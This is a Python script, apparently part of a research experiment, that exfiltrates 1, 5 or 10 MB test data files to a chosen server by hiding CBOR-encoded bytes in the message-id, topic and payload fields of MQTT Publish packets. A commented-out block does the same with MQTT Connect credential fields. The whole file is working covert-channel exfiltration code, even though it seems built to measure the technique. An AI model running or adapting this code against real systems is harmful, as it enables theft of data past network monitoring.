from cbor2 import dumps, loads
import socket
import scapy.contrib.mqtt as mqtt
from scapy.all import IP, TCP, RandShort, send, sr1, load_contrib
import argparse, sys, ipaddress
from util.cborctl import CBORIterator, readFromFile
from hashlib import sha256


parser = argparse.ArgumentParser()
parser.add_argument("-l", "--Length", type=int, help = "Length of data to exfiltrate (1, 5, 10 MB)")
parser.add_argument("-s", "--Segment", action="store_true", help = "Segement packets into Ethernet MTU sizes")
parser.add_argument("-t", "--Target", help = "IP address of server to send exfiltration data to")
args = parser.parse_args()

SEG = False
if args.Segment == True: SEG = True

size = int(args.Length)
if size not in [1,5,10]:
    print("Invalid exfiltration size!")
    sys.exit(1)

SERVER_IP = ""
try:
    ipaddress.ip_address(args.Target)
except ValueError:
    print("Invalid target server address!")
    sys.exit(1)

SERVER_IP = args.Target
PSIZE = 1455

print("\n====================MQTT EXFILTRATION====================\n")

info = "ON" if SEG else "OFF"
print(f"Exfiltrating {size} MB with Segementing {info}")

content = readFromFile(f"data_{size}mb.json")    # bytes von CBOR speichern
#print(type(content))
#print(len(content))
print("Hash of CBOR-encoded content:\n" + sha256(content).hexdigest() + " (Check at receiver!)")
print("Length of payload bytestream: " + str(len(content)) + "\n")
crwaler =  CBORIterator(content)


"""p = mqtt.MQTT()/mqtt.MQTTConnect(clientId=byte_data[:5],
                                 willflag=1, usernameflag=1, passwordflag=1,
                                 willtopic=byte_data[5:10], willmsg=byte_data[10:15],
                                 username=byte_data[15:20], password=byte_data[20:25],
                                 protoname='MQTT', cleansess=1, klive=60, protolevel=6)
a = mqtt.MQTT(QOS=1)/mqtt.MQTTPublish(msgid=1, topic=byte_data[0:14], value=byte_data[14:])

test = mqtt.MQTT()/mqtt.MQTTConnect(clientId=crwaler.getNextBytes(5),
                                 willflag=1, usernameflag=1, passwordflag=1,
                                 willtopic=crwaler.getNextBytes(5), willmsg=crwaler.getNextBytes(5),
                                 username=crwaler.getNextBytes(5), password=crwaler.getNextBytes(5),
                                 protoname='MQTT', cleansess=1, klive=60, protolevel=6)
test = mqtt.MQTT(QOS=1)/mqtt.MQTTPublish(msgid=1, topic=content[:14], value=content[14:1507])"""


# Socket TCP-Verbindung aufbauen
# Publish -> 1453 Böcke
packet_counter = 0
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((SERVER_IP, 1883))  # Verbinden

    print("START sending packets")
    while crwaler.getRemainingLength() >= PSIZE and SEG:
        packet = mqtt.MQTT(QOS=1)/mqtt.MQTTPublish(msgid=int.from_bytes(crwaler.getNextBytes(2), "big"), topic=crwaler.getNextBytes(14), value=crwaler.getNextBytes(1439))
        s.send(bytes(packet))
        packet_counter += 1
        #print(len(packet))
    
    packet = mqtt.MQTT(QOS=1)/mqtt.MQTTPublish(msgid=int.from_bytes(crwaler.getNextBytes(2), "big"), topic=crwaler.getNextBytes(14), value=crwaler.getRemainingBytes())
    s.send(bytes(packet))
    print("FINISHED sending packets")
#    print("Last packet sent: ")
#    packet.show()
    packet_counter += 1
    print("Length of last packet: " + str(len(packet)))

    print("Packets sent: " + str(packet_counter))
